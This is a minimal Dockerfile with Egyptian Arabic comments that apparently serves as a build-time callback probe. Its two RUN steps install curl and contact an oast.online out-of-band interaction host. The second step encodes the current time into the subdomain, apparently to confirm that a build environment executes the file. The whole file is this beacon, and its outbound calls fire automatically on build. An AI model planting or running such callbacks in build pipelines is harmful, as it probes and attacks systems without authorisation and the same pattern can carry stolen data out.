FROM alpine:latest

# نزل Curl ونفذ الأمر الأول
RUN apk add --no-cache curl && curl http://d526g6o3t4gp92l5pbrg4ywsphjkpsg3b.oast.online/docker_init

# الأمر التاني مع الوقت (لازم يكون جوه RUN وتستخدم الـ Command Substitution صح)
RUN export CURRENT_TIME=$(date +%H-%M-%S) && curl "http://${CURRENT_TIME}.d526g6o3t4gp92l5pbrg4ywsphjkpsg3b.oast.online/docker_time"
